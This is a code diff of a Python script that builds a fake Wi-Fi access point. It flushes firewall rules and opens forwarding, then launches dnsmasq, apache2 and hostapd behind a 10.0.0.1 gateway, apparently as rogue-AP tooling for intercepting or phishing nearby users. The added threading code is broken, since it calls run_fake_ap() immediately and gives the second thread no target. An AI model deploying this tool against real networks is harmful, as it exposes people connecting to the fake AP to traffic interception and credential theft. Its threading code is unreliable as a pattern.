@@ -1,5 +1,7 @@
 import os
 import sys
+import threading
+import time
 
 def stops_for_monitor():
 	os.system('systemctl disable systemd-resolved.service')
@@ -23,7 +25,7 @@ def stops_for_monitor():
 	os.system('iptables --delete-chain')
 	os.system('iptables --table nat --delete-chain')
 	os.system('iptables -P FORWARD ACCEPT')
-def creat_files():
+def create_files():
 	line="python3 create_files.py "+sys.argv[1] + " " + sys.argv[2]
 	os.system(line)
 
@@ -31,9 +33,13 @@ def run_fake_ap():
 	os.system('dnsmasq -C dnsmasq.conf')
 	os.system('service apache2 start')
 	os.system('route add default gw 10.0.0.1')
-	os.system('hostapd hostapd.conf -B')
+	os.system('hostapd hostapd.conf')
 	os.system('service apache2 start')
 	os.system('route add default gw 10.0.0.1')
+
+def route_add():
+	os.system('route add default gw 10.0.0.1')
+
 
 def remove_temp_files():
 	try:
@@ -60,9 +66,14 @@ def close_fake_ap():
 
 if __name__ == "__main__":
 	stops_for_monitor()
-	creat_files()
-	run_fake_ap()
-	empty = input ("Press Enter to close AP...\n")
+	create_files()
+	t1 = threading.Thread(target=run_fake_ap())
+	t2 = threading.Thread(route_add())
+	t1.start()
+	time.sleep(1)
+	t2.start()
+	t1.join()
+	t2.join()
 	remove_temp_files()
 	close_fake_ap()
 
